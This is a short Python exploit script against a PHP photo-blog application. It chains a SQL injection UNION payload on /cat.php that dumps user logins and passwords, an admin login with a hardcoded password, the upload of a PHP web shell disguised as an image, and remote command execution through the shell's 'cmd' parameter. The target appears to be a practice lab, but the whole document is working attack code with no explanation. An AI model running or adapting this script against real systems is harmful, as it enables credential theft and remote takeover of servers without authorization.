import requests

target="" #ip_victim
path_file=""# path to shell file
command='uname -a'

def trigger():
    path_sqli="/cat.php"
    url = "http://" + target + path_sqli
    payload = {'id':"2 UNION SELECT NULL,concat_ws(' : ' ,id,login,password),NULL,NULL FROM photoblog.users"}
    r=requests.get(url, params=payload, verify=False)
    print(r.text)
    login()

def login():
    path="/admin/index.php"
    url="http://" + target + path
    payload={'user':'admin', 'password':'P4ssw0rd'}
    r=requests.post(url, data=payload, verify=False)
    print(r.status_code)
    idcookies=(r.cookies['PHPSESSID'])
    file_upload(idcookies)

def file_upload(idcookies):
    path="/admin/index.php"
    url = "http://" + target + path
    payload = {'title':"hpl", 'category':'1', 'Add':'Add'}
    files={'image':('lovecraft.php3',open(path_file,'rb'),'application/x-php')}
    cookies=dict(PHPSESSID=idcookies)
    requests.post(url, files=files, data=payload, cookies=cookies, verify=False)
    remote_console()

def remote_console():
    path="/admin/uploads/lovecraft"
    url = "http://" + target + path
    payload = {'cmd':command}
    r=requests.get(url, params=payload, verify=False)
    print(r.text)

	
#start

trigger()
